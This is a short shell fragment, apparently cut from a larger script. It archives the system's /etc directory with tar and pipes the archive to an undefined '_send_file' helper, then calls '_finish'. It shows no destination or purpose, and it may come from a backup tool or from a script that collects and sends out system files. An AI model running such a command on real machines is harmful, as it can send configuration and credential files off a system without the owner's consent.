
for d in etc;do
  tar -cf - /$d | _send_file "main/$d.tar"
done
_finish
